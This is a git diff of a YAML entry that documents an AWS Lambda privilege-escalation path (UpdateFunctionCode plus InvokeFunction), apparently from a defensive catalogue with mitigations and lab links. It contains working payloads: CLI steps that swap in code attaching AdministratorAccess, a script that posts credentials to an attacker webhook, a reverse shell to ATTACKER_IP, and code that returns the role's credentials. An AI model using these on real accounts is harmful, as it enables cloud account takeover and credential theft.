@@ -1,13 +1,12 @@
 id: lambda-004
+parent:
+  id: lambda-003
+  modification: This variation uses lambda:InvokeFunction to manually invoke the function instead of waiting for automatic triggers
 name: lambda:UpdateFunctionCode + lambda:InvokeFunction
 category: existing-passrole
 services:
 - lambda
-description: A principal with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction`
-  can modify the code of an existing Lambda function that has a privileged execution
-  role and then manually invoke it. By replacing the function code with malicious
-  code and invoking it, the attacker can execute arbitrary commands with the privileges
-  of the function's execution role immediately, without waiting for automatic triggers.
+description: A principal with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` can modify the code of an existing Lambda function that has a privileged execution role and then manually invoke it. By replacing the function code with malicious code and invoking it, the attacker can execute arbitrary commands with the privileges of the function's execution role immediately, without waiting for automatic triggers.
 prerequisites:
   admin:
   - A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)
@@ -16,8 +15,7 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: 'echo ''import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker",
-      PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")'' > lambda_function.py
+    command: 'echo ''import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")'' > lambda_function.py
 
       '
     description: Create malicious Lambda function code that escalates privileges
@@ -25,26 +23,13 @@ exploitationSteps:
     command: zip exploit.zip lambda_function.py
     description: Package the malicious code into a deployment package
   - step: 3
-    command: "aws lambda update-function-code --function-name TARGET_FUNCTION \\\n\
-      \  --zip-file fileb://exploit.zip\n"
+    command: "aws lambda update-function-code --function-name TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n"
     description: Update the target Lambda function with the malicious code
   - step: 4
     command: aws lambda invoke --function-name TARGET_FUNCTION output.txt
     description: Manually invoke the function to execute the privilege escalation
-recommendation: "Restrict the `lambda:UpdateFunctionCode` permission using the principle\
-  \ of least privilege.\nUse resource-based policies to limit which functions can\
-  \ be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:UpdateFunctionCode\"\
-  ,\n  \"Resource\": \"arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction\"\
-  \n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateFunctionCode`\
-  \ events on sensitive functions\n- Implement Lambda function versioning and aliases\
-  \ to prevent direct modification\n- Use AWS Config rules to detect changes to Lambda\
-  \ function code\n- Require code signing for Lambda deployments\n- Alert on Lambda\
-  \ functions with privileged roles being modified\n"
-limitations: 'This path provides administrative access only if the target resource''s
-  execution role has administrative permissions. The attacker gains whatever permissions
-  the resource''s role has. If the role has limited permissions, the attacker gains
-  limited access. However, even limited access may enable multi-hop attacks or access
-  to sensitive data.
+recommendation: "Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.\nUse resource-based policies to limit which functions can be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:UpdateFunctionCode\",\n  \"Resource\": \"arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions\n- Implement Lambda function versioning and aliases to prevent direct modification\n- Use AWS Config rules to detect changes to Lambda function code\n- Require code signing for Lambda deployments\n- Alert on Lambda functions with privileged roles being modified\n"
+limitations: 'This path provides administrative access only if the target resource''s execution role has administrative permissions. The attacker gains whatever permissions the resource''s role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.
 
   '
 discoveryAttribution:
@@ -53,8 +38,7 @@ discoveryAttribution:
     date: 2025
   derivativeOf:
     pathId: lambda-003
-    modification: Uses lambda:InvokeFunction to manually invoke the function instead
-      of waiting for automatic triggers
+    modification: This variation uses lambda:InvokeFunction to manually invoke the function instead of waiting for automatic triggers
   ultimateOrigin:
     pathId: lambda-003
     author: Spencer Gietzen
@@ -84,228 +68,127 @@ learningEnvironments:
     type: open-source
     githubLink: https://github.com/DataDog/pathfinding-labs
     scenario: privesc-one-hop/to-admin/lambda-updatefunctioncode
-    description: Deploy Terraform into your own AWS account to practice this attack
-      path
+    description: Deploy Terraform into your own AWS account to practice this attack path
   iam-vulnerable:
     type: open-source
     githubLink: https://github.com/BishopFox/iam-vulnerable
     scenario: Lambda-EditExistingLambdaFunctionWithRole
-    description: Deploy Terraform into your own AWS account and practice individual
-      exploitation paths
+    description: Deploy Terraform into your own AWS account and practice individual exploitation paths
 permissions:
   required:
   - permission: lambda:UpdateFunctionCode
-    resourceConstraints: Must have permission to update the target Lambda function's
-      code
+    resourceConstraints: Must have permission to update the target Lambda function's code
   - permission: lambda:InvokeFunction
     resourceConstraints: Must have permission to invoke the target Lambda function
   additional:
   - permission: lambda:ListFunctions
     resourceConstraints: Helpful for discovering available Lambda functions to target
   - permission: lambda:GetFunction
-    resourceConstraints: Useful for viewing function details including execution role
-      ARN
+    resourceConstraints: Useful for viewing function details including execution role ARN
   - permission: lambda:GetFunctionConfiguration
     resourceConstraints: Useful for viewing function configuration details
   - permission: iam:GetRole
-    resourceConstraints: Useful for viewing the execution role's trust policy and
-      permissions
+    resourceConstraints: Useful for viewing the execution role's trust policy and permissions
   - permission: iam:ListAttachedRolePolicies
-    resourceConstraints: Useful for understanding what permissions the execution role
-      has
+    resourceConstraints: Useful for understanding what permissions the execution role has
 attackVisualization:
   nodes:
   - id: start
     label: Starting Principal
     type: principal
-    description: 'The starting principal (user or role) with `lambda:UpdateFunctionCode`
-      permission. This principal will modify the code of an existing Lambda function
-      that has a privileged execution role, replacing it with malicious code to gain
-      elevated privileges.
+    description: 'The starting principal (user or role) with `lambda:UpdateFunctionCode` permission. This principal will modify the code of an existing Lambda function that has a privileged execution role, replacing it with malicious code to gain elevated privileges.
 
       '
   - id: lambda_function
     label: Existing Lambda Function
     type: resource
-    description: 'An existing Lambda function with a privileged IAM execution role.
-      The attacker has `lambda:InvokeFunction` permission to manually invoke the function
-      after updating its code. The function''s execution role determines the level
-      of access the attacker will gain.
+    description: 'An existing Lambda function with a privileged IAM execution role. The attacker has `lambda:InvokeFunction` permission to manually invoke the function after updating its code. The function''s execution role determines the level of access the attacker will gain.
 
       '
   - id: execution_role
     label: Lambda Execution Role
     type: principal
-    description: 'The IAM role attached to the Lambda function as its execution role.
-      When the function is invoked, Lambda automatically assumes this role and makes
-      its credentials available to the function code through the AWS SDK. All code
-      executed in the function runs with the permissions of this execution role. This
-      role must trust lambda.amazonaws.com in its trust policy.
+    description: 'The IAM role attached to the Lambda function as its execution role. When the function is invoked, Lambda automatically assumes this role and makes its credentials available to the function code through the AWS SDK. All code executed in the function runs with the permissions of this execution role. This role must trust lambda.amazonaws.com in its trust policy.
 
       '
   - id: method_sdk_attack
     label: 'Method 1: Execute Attack via AWS SDK'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code uses the AWS SDK to directly\
-      \ perform privileged actions using the execution role's credentials. The function\
-      \ can call IAM APIs to elevate the starting principal's permissions, create\
-      \ access keys, modify policies, or perform other administrative actions. Since\
-      \ the function runs with the execution role's credentials automatically available,\
-      \ no credential exfiltration is needed.\n\nExample malicious Lambda code:\n\
-      ```python\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n\
-      \    # Attach admin policy to starting user\n    iam.attach_user_policy(\n \
-      \       UserName='attacker-user',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n\
-      \    )\n    return {'statusCode': 200, 'body': 'Privilege escalation complete'}\n\
-      ```\n\nThis is the most direct approach - the Lambda function immediately modifies\
-      \ IAM or performs other privileged actions using its execution role's permissions.\n"
+    description: "The malicious Lambda function code uses the AWS SDK to directly perform privileged actions using the execution role's credentials. The function can call IAM APIs to elevate the starting principal's permissions, create access keys, modify policies, or perform other administrative actions. Since the function runs with the execution role's credentials automatically available, no credential exfiltration is needed.\n\nExample malicious Lambda code:\n```python\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    # Attach admin policy to starting user\n    iam.attach_user_policy(\n        UserName='attacker-user',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'statusCode': 200, 'body': 'Privilege escalation complete'}\n```\n\nThis is the most direct approach - the Lambda function immediately modifies IAM or performs other privileged actions using its execution role's permissions.\n"
   - id: method_webhook_exfil
     label: 'Method 2: Exfiltrate Credentials to Webhook'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code retrieves the execution role's\
-      \ temporary credentials from the Lambda environment and exfiltrates them to\
-      \ an attacker-controlled webhook or HTTP endpoint. The credentials are automatically\
-      \ available in environment variables that the AWS SDK uses.\n\nExample malicious\
-      \ Lambda code:\n```python\nimport os\nimport json\nimport urllib.request\n\n\
-      def lambda_handler(event, context):\n    # Get credentials from environment\n\
-      \    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n   \
-      \     'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token':\
-      \ os.environ['AWS_SESSION_TOKEN']\n    }\n\n    # Exfiltrate to webhook\n  \
-      \  req = urllib.request.Request(\n        'https://attacker-webhook.com/collect',\n\
-      \        data=json.dumps(creds).encode(),\n        headers={'Content-Type':\
-      \ 'application/json'}\n    )\n    urllib.request.urlopen(req)\n\n    return\
-      \ {'statusCode': 200}\n```\n\nThe attacker receives the credentials remotely\
-      \ and can use them from any location until they expire (typically 15 minutes\
-      \ to 1 hour).\n"
+    description: "The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and exfiltrates them to an attacker-controlled webhook or HTTP endpoint. The credentials are automatically available in environment variables that the AWS SDK uses.\n\nExample malicious Lambda code:\n```python\nimport os\nimport json\nimport urllib.request\n\ndef lambda_handler(event, context):\n    # Get credentials from environment\n    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token': os.environ['AWS_SESSION_TOKEN']\n    }\n\n    # Exfiltrate to webhook\n    req = urllib.request.Request(\n        'https://attacker-webhook.com/collect',\n        data=json.dumps(creds).encode(),\n        headers={'Content-Type': 'application/json'}\n    )\n    urllib.request.urlopen(req)\n\n    return {'statusCode': 200}\n```\n\nThe attacker receives the credentials remotely and can use them from any location until they expire (typically 15 minutes to 1 hour).\n"
   - id: method_reverse_shell
     label: 'Method 3: Reverse Shell Connection'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function establishes a reverse shell connection\
-      \ back to an attacker-controlled listener, providing interactive access. From\
-      \ within the reverse shell, the attacker can access the execution role's credentials\
-      \ and run arbitrary AWS CLI commands.\n\nExample malicious Lambda code:\n```python\n\
-      import socket\nimport subprocess\nimport os\n\ndef lambda_handler(event, context):\n\
-      \    # Establish reverse shell\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
-      \    s.connect(('ATTACKER_IP', 4444))\n\n    # Redirect stdin/stdout/stderr\
-      \ to socket\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(),\
-      \ 2)\n\n    # Start shell\n    subprocess.call(['/bin/sh', '-i'])\n\n    return\
-      \ {'statusCode': 200}\n```\n\nThis provides an interactive shell session within\
-      \ the Lambda execution environment where the attacker can access credentials\
-      \ and execute AWS CLI commands with the execution role's permissions. The session\
-      \ lasts until the Lambda function times out (max 15 minutes).\n"
+    description: "The malicious Lambda function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access. From within the reverse shell, the attacker can access the execution role's credentials and run arbitrary AWS CLI commands.\n\nExample malicious Lambda code:\n```python\nimport socket\nimport subprocess\nimport os\n\ndef lambda_handler(event, context):\n    # Establish reverse shell\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('ATTACKER_IP', 4444))\n\n    # Redirect stdin/stdout/stderr to socket\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n\n    # Start shell\n    subprocess.call(['/bin/sh', '-i'])\n\n    return {'statusCode': 200}\n```\n\nThis provides an interactive shell session within the Lambda execution environment where the attacker can access credentials and execute AWS CLI commands with the execution role's permissions. The session lasts until the Lambda function times out (max 15 minutes).\n"
   - id: method_output_exfil
     label: 'Method 4: Exfiltrate Credentials to Output'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code retrieves the execution role's\
-      \ temporary credentials from the Lambda environment and returns them in the\
-      \ function's response output. This allows the attacker to read the credentials\
-      \ directly from the Lambda invocation result without needing an external webhook\
-      \ or reverse shell.\n\nExample malicious Lambda code:\n```python\nimport os\n\
-      import json\n\ndef lambda_handler(event, context):\n    # Get credentials from\
-      \ environment\n    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n\
-      \        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token':\
-      \ os.environ['AWS_SESSION_TOKEN']\n    }\n    \n    # Return credentials in\
-      \ the response\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n\
-      \            'message': 'Credentials exfiltrated',\n            'credentials':\
-      \ creds\n        })\n    }\n```\n\nThe attacker invokes the function and reads\
-      \ the credentials from the response output. These credentials can then be exported\
-      \ and used from any location until they expire (typically 15 minutes to 1 hour)."
+    description: "The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and returns them in the function's response output. This allows the attacker to read the credentials directly from the Lambda invocation result without needing an external webhook or reverse shell.\n\nExample malicious Lambda code:\n```python\nimport os\nimport json\n\ndef lambda_handler(event, context):\n    # Get credentials from environment\n    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token': os.environ['AWS_SESSION_TOKEN']\n    }\n    \n    # Return credentials in the response\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'message': 'Credentials exfiltrated',\n            'credentials': creds\n        })\n    }\n```\n\nThe attacker invokes the function and reads the credentials from the response output. These credentials can then be exported and used from any location until they expire (typically 15 minutes to 1 hour)."
   - id: admin_outcome
     label: Effective Administrator
     type: outcome
-    description: 'If the target Lambda function''s execution role has administrative
-      permissions (AdministratorAccess or equivalent), the attacker gains full administrative
-      access to the AWS account by executing the malicious code. The code can directly
-      modify IAM to grant the starting principal admin access or return admin credentials.
+    description: 'If the target Lambda function''s execution role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing the malicious code. The code can directly modify IAM to grant the starting principal admin access or return admin credentials.
 
       '
   - id: partial_outcome
     label: Some additional access
     type: outcome
     color: '#ffeb99'
-    description: 'If the Lambda function''s execution role has elevated but non-administrative
-      permissions, the attacker gains partial privilege escalation. This could include
-      access to sensitive data stores (S3, RDS, DynamoDB), the ability to modify other
-      resources, or permissions that enable additional privilege escalation paths.
+    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB), the ability to modify other resources, or permissions that enable additional privilege escalation paths.
 
       '
   - id: minimal_outcome
     label: No additional access
     type: outcome
     color: '#cccccc'
-    description: 'If the Lambda function''s execution role only has minimal permissions
-      (e.g., just CloudWatch Logs access), the privilege escalation may not yield
-      meaningful additional access. However, the attacker still gains code execution
-      capability which could be useful for reconnaissance or as part of a multi-step
-      attack.
+    description: 'If the Lambda function''s execution role only has minimal permissions (e.g., just CloudWatch Logs access), the privilege escalation may not yield meaningful additional access. However, the attacker still gains code execution capability which could be useful for reconnaissance or as part of a multi-step attack.
 
       '
   edges:
   - from: start
     to: lambda_function
     label: lambda:UpdateFunctionCode
-    description: "The attacker updates the target Lambda function's code with malicious\
-      \ code. This requires creating a deployment package (ZIP file) containing the\
-      \ malicious code and uploading it to replace the function's existing code.\n\
-      \nCommands:\n```bash\necho 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"\
-      attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\n\
-      zip exploit.zip lambda_function.py\naws lambda update-function-code \\\n  --function-name\
-      \ TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n```\n\nThe malicious\
-      \ code is now deployed and will execute with the function's execution role permissions\
-      \ when invoked.\n"
+    description: "The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.\n\nCommands:\n```bash\necho 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\nzip exploit.zip lambda_function.py\naws lambda update-function-code \\\n  --function-name TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n```\n\nThe malicious code is now deployed and will execute with the function's execution role permissions when invoked.\n"
   - from: lambda_function
     to: execution_role
     label: lambda:InvokeFunction
-    description: "The attacker manually invokes the Lambda function using the `lambda:InvokeFunction`\
-      \ permission. When invoked, Lambda assumes the function's execution role and\
-      \ makes its credentials available to the malicious function code.\n\nCommand:\n\
-      ```bash\naws lambda invoke \\\n  --function-name TARGET_FUNCTION \\\n  output.txt\n\
-      ```\n\nThe function executes immediately with the execution role's credentials.\n"
+    description: "The attacker manually invokes the Lambda function using the `lambda:InvokeFunction` permission. When invoked, Lambda assumes the function's execution role and makes its credentials available to the malicious function code.\n\nCommand:\n```bash\naws lambda invoke \\\n  --function-name TARGET_FUNCTION \\\n  output.txt\n```\n\nThe function executes immediately with the execution role's credentials.\n"
   - from: execution_role
     to: method_sdk_attack
     label: Option A
-    description: 'The malicious function code uses the AWS SDK to directly perform
-      privileged actions. This is the most direct approach - the function immediately
-      modifies IAM or performs other privileged actions using its execution role''s
-      permissions.
+    description: 'The malicious function code uses the AWS SDK to directly perform privileged actions. This is the most direct approach - the function immediately modifies IAM or performs other privileged actions using its execution role''s permissions.
 
       '
   - from: execution_role
     to: method_webhook_exfil
     label: Option B
-    description: 'The malicious function code retrieves the execution role''s temporary
-      credentials and exfiltrates them to an attacker-controlled webhook. The attacker
-      can then use these credentials from any location.
+    description: 'The malicious function code retrieves the execution role''s temporary credentials and exfiltrates them to an attacker-controlled webhook. The attacker can then use these credentials from any location.
 
       '
   - from: execution_role
     to: method_reverse_shell
     label: Option C
-    description: 'The malicious function establishes a reverse shell connection back
-      to an attacker-controlled listener, providing interactive access with the execution
-      role''s credentials.
+    description: 'The malicious function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access with the execution role''s credentials.
 
       '
   - from: execution_role
     to: method_output_exfil
     label: Option D
     branch: D
-    description: The attacker designed the malicious function code to retrieve the
-      execution role's temporary credentials and return them in the Lambda response
-      output. The attacker can then read the credentials directly from the invocation
-      result.
+    description: The attacker designed the malicious function code to retrieve the execution role's temporary credentials and return them in the Lambda response output. The attacker can then read the credentials directly from the invocation result.
   - from: method_sdk_attack
     to: admin_outcome
     label: If role has admin permissions
     branch: A1
     condition: admin
-    description: 'If the Lambda function''s execution role has AdministratorAccess
-      or equivalent administrative permissions, the SDK attack directly grants the
-      starting principal full administrative access by attaching admin policies or
-      creating admin access keys.
+    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the SDK attack directly grants the starting principal full administrative access by attaching admin policies or creating admin access keys.
 
       '
   - from: method_sdk_attack
@@ -313,9 +196,7 @@ attackVisualization:
     label: If role has some permissions
     branch: A2
     condition: some_permissions
-    description: 'If the Lambda function''s execution role has elevated but non-administrative
-      permissions, the SDK attack can still grant useful additional permissions by
-      modifying IAM within the role''s permission scope or accessing sensitive resources.
+    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the SDK attack can still grant useful additional permissions by modifying IAM within the role''s permission scope or accessing sensitive resources.
 
       '
   - from: method_sdk_attack
@@ -323,10 +204,7 @@ attackVisualization:
     label: If role has minimal permissions
     branch: A3
     condition: no_permissions
-    description: 'If the Lambda function''s execution role only has minimal permissions
-      (typically just CloudWatch Logs), the SDK attack will fail to perform meaningful
-      privilege escalation. The attacker would need to choose a different exploitation
-      method.
+    description: 'If the Lambda function''s execution role only has minimal permissions (typically just CloudWatch Logs), the SDK attack will fail to perform meaningful privilege escalation. The attacker would need to choose a different exploitation method.
 
       '
   - from: method_webhook_exfil
@@ -334,9 +212,7 @@ attackVisualization:
     label: If role has admin permissions
     branch: B1
     condition: admin
-    description: 'If the Lambda function''s execution role has AdministratorAccess
-      or equivalent administrative permissions, the exfiltrated credentials provide
-      the attacker with full administrative access to the AWS account from any location.
+    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the exfiltrated credentials provide the attacker with full administrative access to the AWS account from any location.
 
       '
   - from: method_webhook_exfil
@@ -344,9 +220,7 @@ attackVisualization:
     label: If role has some permissions
     branch: B2
     condition: some_permissions
-    description: 'If the Lambda function''s execution role has elevated but non-administrative
-      permissions, the exfiltrated credentials provide partial privilege escalation
-      including access to S3, RDS, DynamoDB, or permissions to modify specific resources.
+    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the exfiltrated credentials provide partial privilege escalation including access to S3, RDS, DynamoDB, or permissions to modify specific resources.
 
       '
   - from: method_webhook_exfil
@@ -354,9 +228,7 @@ attackVisualization:
     label: If role has minimal permissions
     branch: B3
     condition: no_permissions
-    description: 'If the Lambda function''s execution role only has minimal permissions
-      (typically just CloudWatch Logs), the exfiltrated credentials may not provide
-      significant additional access beyond what the starting principal already had.
+    description: 'If the Lambda function''s execution role only has minimal permissions (typically just CloudWatch Logs), the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had.
 
       '
   - from: method_reverse_shell
@@ -364,10 +236,7 @@ attackVisualization:
     label: If role has admin permissions
     branch: C1
     condition: admin
-    description: 'If the Lambda function''s execution role has AdministratorAccess
-      or equivalent administrative permissions, the reverse shell provides interactive
-      access with full administrative credentials. The attacker can run any AWS CLI
-      commands until the Lambda function times out.
+    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the reverse shell provides interactive access with full administrative credentials. The attacker can run any AWS CLI commands until the Lambda function times out.
 
       '
   - from: method_reverse_shell
@@ -375,9 +244,7 @@ attackVisualization:
     label: If role has some permissions
     branch: C2
     condition: some_permissions
-    description: 'If the Lambda function''s execution role has elevated but non-administrative
-      permissions, the reverse shell provides interactive access to explore the available
-      permissions and manually exploit them for partial privilege escalation.
+    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the reverse shell provides interactive access to explore the available permissions and manually exploit them for partial privilege escalation.
 
       '
   - from: method_reverse_shell
@@ -385,10 +252,7 @@ attackVisualization:
     label: If role has minimal permissions
     branch: C3
     condition: no_permissions
-    description: 'If the Lambda function''s execution role only has minimal permissions,
-      the reverse shell still provides interactive code execution capability which
-      could be useful for reconnaissance, but may not provide significant privilege
-      escalation.
+    description: 'If the Lambda function''s execution role only has minimal permissions, the reverse shell still provides interactive code execution capability which could be useful for reconnaissance, but may not provide significant privilege escalation.
 
       '
   - from: method_output_exfil
@@ -396,22 +260,16 @@ attackVisualization:
     label: If role has admin permissions
     branch: D1
     condition: admin
-    description: If the execution role has AdministratorAccess or equivalent administrative
-      permissions, the credentials returned in the output provide the attacker with
-      full administrative access to the AWS account from any location.
+    description: If the execution role has AdministratorAccess or equivalent administrative permissions, the credentials returned in the output provide the attacker with full administrative access to the AWS account from any location.
   - from: method_output_exfil
     to: partial_outcome
     label: If role has some permissions
     branch: D2
     condition: some_permissions
-    description: If the execution role has elevated but non-administrative permissions,
-      the credentials returned in the output provide partial privilege escalation
-      including access to S3, RDS, DynamoDB, or permissions to modify specific resources.
+    description: If the execution role has elevated but non-administrative permissions, the credentials returned in the output provide partial privilege escalation including access to S3, RDS, DynamoDB, or permissions to modify specific resources.
   - from: method_output_exfil
     to: minimal_outcome
     label: If role has minimal permissions
     branch: D3
     condition: no_permissions
-    description: If the execution role only has minimal permissions, the credentials
-      returned in the output may not provide significant additional access beyond
-      what the starting principal already had.
+    description: If the execution role only has minimal permissions, the credentials returned in the output may not provide significant additional access beyond what the starting principal already had.
